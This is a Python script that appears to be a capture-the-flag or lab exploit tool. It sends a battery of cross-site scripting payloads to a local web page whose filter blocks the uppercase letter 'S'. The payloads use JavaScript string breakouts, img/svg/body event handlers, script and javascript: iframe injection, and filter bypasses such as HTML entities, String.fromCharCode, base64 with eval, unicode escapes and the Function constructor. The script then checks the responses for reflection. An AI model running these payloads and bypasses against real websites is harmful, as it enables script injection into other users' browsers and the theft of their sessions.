import requests
import urllib.parse
import html
import re

# Target URL
target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def html_entity_encode(s):
    """Encode as HTML entities (e.g., XSS -> &#88;&#83;&#83;)"""
    return ''.join(f'&#{ord(c)};' for c in s)

def test_payloads():
    """Test various XSS bypass techniques for uppercase 'S' filter"""
    results = []
    
    # First, let's see what the base response looks like
    print("[INFO] Getting baseline response...")
    try:
        baseline = requests.get(f"{target_url}?name=test", timeout=10)
        baseline_text = baseline.text
        print(f"Baseline length: {len(baseline_text)} bytes")
        
        # Extract the reflection context
        if 'var name =' in baseline_text:
            match = re.search(r'var name = "([^"]*)"', baseline_text)
            if match:
                reflected_value = match.group(1)
                print(f"Reflection pattern: var name = \"{reflected_value}\"")
                print(f"This confirms we're in JS string context")
    except Exception as e:
        print(f"Error getting baseline: {e}")
        return
    
    print("\n" + "="*80)
    print("TESTING XSS PAYLOADS WITH VARIOUS ENCODINGS")
    print("="*80)
    
    # Test suite 1: HTML entity encoded versions (no uppercase S in transmission)
    test_suite1 = [
        ("HTML entity &#88;&#83;&#83;", "<img src=x onerror=alert(\"" + html_entity_encode("XSS") + "\")>"),
        ("HTML entity in JS", "<svg onload=alert(\"" + html_entity_encode("XSS") + "\")>"),
        ("Body onload", "<body onload=alert(\"" + html_entity_encode("XSS") + "\")>"),
    ]
    
    # Test suite 2: Breakout from JS string then HTML tags
    test_suite2 = [
        ("Breakout + img tag", "\";'><img src=x onerror=alert(String.fromCharCode(88,83,83))>//"),
        ("Breakout + body tag", "\";'><body onload=alert(String.fromCharCode(88,83,83))>//"),
        ("Breakout + svg tag", "\";'><svg onload=alert(String.fromCharCode(88,83,83))>//"),
        ("Breakout + iframe", "\";'><iframe src=javascript:alert(String.fromCharCode(88,83,83))>//"),
    ]
    
    # Test suite 3: Full HTML context payloads (no JS breakout needed)
    test_suite3 = [
        ("Direct img onerror", "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"),
        ("Direct svg onload", "<svg onload=alert(String.fromCharCode(88,83,83))>"),
        ("Direct script tag", "<script>alert(String.fromCharCode(88,83,83))</script>"),
        ("Data URI", "<img src=x onerror=eval(atob(\"YWxlcnQoJ1hTUycp\"))>"),
    ]
    
    # Test suite 4: Mixed encodings (double encoding for filter bypass)
    test_suite4 = [
        ("Mixed - HTML entity + unicode", "<img src=x onerror=alert('\\u0058\\u0053\\u0053')>"),
        ("Mixed - Split construction", "<svg onload=var x=String.fromCharCode(88,83,83),alert(x)>"),
        ("Mixed - Function constructor", "<body onload=Function('alert(\"XSS\")')()>"),
    ]
    
    # Combine all test suites
    all_tests = test_suite1 + test_suite2 + test_suite3 + test_suite4
    
    positive_results = []
    
    for i, (desc, payload) in enumerate(all_tests, 1):
        print(f"\n[TEST {i:02d}] {desc}")
        print(f"Payload: {payload}")
        
        url_encoded = url_encode(payload)
        print(f"URL-encoded: {url_encoded}")
        
        try:
            url = f"{target_url}?name={url_encoded}"
            response = requests.get(url, timeout=10)
            response_text = response.text
            
            print(f"Status: {response.status_code}")
            print(f"Length: {len(response_text)} bytes (baseline: {len(baseline_text)})")
            
            # Check for "XSS" in response
            if "XSS" in response_text:
                print(f"[!] SUCCESS: 'XSS' found in response!")
                
                # Check if it's in a script context
                if "<script>" in re.sub(r'<script[^>]*>', '<script>', response_text) and "alert" in response_text:
                    print(f"[!!] HIGH PROBABILITY: XSS payload executed!")
                elif "onerror=" in response_text or "onload=" in response_text:
                    print(f"[!!] HIGH PROBABILITY: Event handler present!")
                
                positive_results.append((desc, payload, response_text))
            else:
                # Check for variations of the payload being reflected
                reflected_indicators = [
                    "String.fromCharCode" in response_text,
                    "atob(" in response_text,
                    "onerror=" in response_text,
                    "onload=" in response_text,
                    "<svg" in response_text,
                    "<img" in response_text,
                ]
                
                if any(reflected_indicators):
                    print(f"[+] Partial: Some payload elements reflected")
                    for idx, indicator in enumerate(reflected_indicators):
                        if indicator:
                            indicator_names = ["String.fromCharCode", "atob(", "onerror=", "onload=", "<svg", "<img"]
                            print(f"  - {indicator_names[idx]} found")
                else:
                    print(f"[-] Blocked: No payload elements reflected")
            
            # If response differs from baseline, show snippet
            if len(response_text) != len(baseline_text):
                diff_start = 0
                # Find where they differ
                for j in range(min(len(response_text), len(baseline_text))):
                    if response_text[j] != baseline_text[j]:
                        diff_start = j
                        break
                snippet = response_text[diff_start:diff_start+200]
                print(f"Difference snippet: {snippet[:150]}...")
            
        except Exception as e:
            print(f"[-] Error: {str(e)}")
        
        print("-"*70)
    
    # Summary
    print("\n" + "="*80)
    print("SUMMARY")
    print("="*80)
    if positive_results:
        print(f"[+] Found {len(positive_results)} promising results")
        for desc, payload, _ in positive_results:
            print(f"  - {desc}")
            print(f"    Payload: {payload}")
    else:
        print("[-] No 'XSS' string found in responses")
        print("[?] Filter may be completely blocking uppercase letters or HTML tags")

test_payloads()
